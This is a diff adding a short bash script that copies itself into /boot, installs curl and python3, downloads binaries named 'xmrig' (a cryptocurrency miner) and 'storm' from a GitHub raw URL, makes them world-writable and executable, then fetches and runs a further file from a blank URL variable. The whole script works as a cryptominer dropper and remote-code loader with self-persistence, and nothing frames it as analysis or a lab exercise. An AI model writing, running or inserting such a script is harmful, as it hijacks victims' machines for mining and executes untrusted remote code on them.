@@ -1,0 +1,21 @@
+#!/bin/bash
+cp $(pwd)/$0 /boot
+mv /boot/$0 /boot/main
+cd /tmp
+
+url=
+file_name=
+
+apt-get update -y
+apt-get install curl -y
+apt-get install python3 -y
+
+curl -O "https://raw.githubusercontent.com/rxu7s/Public/main/xmrig"
+curl -O "https://raw.githubusercontent.com/rxu7s/Public/main/storm"
+
+chmod 777 xmrig
+chmod 777 storm
+
+curl -o $file_name $url
+chmod 777 $file_name
+./$file_name
